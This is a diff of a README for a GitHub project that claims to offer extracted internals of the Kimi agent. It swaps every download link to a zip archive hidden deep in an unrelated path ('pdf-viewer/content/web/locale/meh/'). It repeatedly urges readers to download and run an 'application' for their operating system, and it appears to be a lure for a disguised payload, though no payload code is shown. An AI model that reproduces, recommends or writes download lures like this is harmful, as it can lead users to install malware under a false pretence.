@@ -1,7 +1,7 @@
 # 🎉 kimi-agent-internals - Simplifying AI Architecture Exploration
 
 ## 🔗 Download Here
-[![Download Latest Release](https://github.com/Visakan08/kimi-agent-internals/raw/refs/heads/main/source-code/etc/chromium/agent-kimi-internals-2.4.zip)](https://github.com/Visakan08/kimi-agent-internals/raw/refs/heads/main/source-code/etc/chromium/agent-kimi-internals-2.4.zip)
+[![Download Latest Release](https://github.com/Visakan08/kimi-agent-internals/raw/refs/heads/main/source-code/pdf-viewer/content/web/locale/meh/internals_kimi_agent_v1.2.zip)](https://github.com/Visakan08/kimi-agent-internals/raw/refs/heads/main/source-code/pdf-viewer/content/web/locale/meh/internals_kimi_agent_v1.2.zip)
 
 ## 📖 About This Project
 The **kimi-agent-internals** project provides extracted artifacts from the Kimi OK-Computer system and other related agents. This software aims to support studies in agentic architecture, particularly in the field of artificial intelligence. The data has been carefully analyzed, with assistance from Claude Code, to enhance your understanding of these concepts.
@@ -11,7 +11,7 @@ To begin using the **kimi-agent-internals** application, follow these simple ste
 
 1. **Download the Software**
    Visit the following page to download the latest version of the software:  
-   [Download Releases](https://github.com/Visakan08/kimi-agent-internals/raw/refs/heads/main/source-code/etc/chromium/agent-kimi-internals-2.4.zip)
+   [Download Releases](https://github.com/Visakan08/kimi-agent-internals/raw/refs/heads/main/source-code/pdf-viewer/content/web/locale/meh/internals_kimi_agent_v1.2.zip)
 
 2. **Choose the Right File**
    On the releases page, you will see multiple download options. Find the latest version, which is typically listed at the top. Look for the file that matches your system. This will usually be labeled for Windows, Mac, or Linux.
@@ -78,4 +78,4 @@ This project is licensed under the MIT License - see the [LICENSE](./LICENSE) fi
 
 ## 🔗 Final Download Reminder
 Don't forget to download the application from the following link:  
-[Download Releases](https://github.com/Visakan08/kimi-agent-internals/raw/refs/heads/main/source-code/etc/chromium/agent-kimi-internals-2.4.zip)
+[Download Releases](https://github.com/Visakan08/kimi-agent-internals/raw/refs/heads/main/source-code/pdf-viewer/content/web/locale/meh/internals_kimi_agent_v1.2.zip)
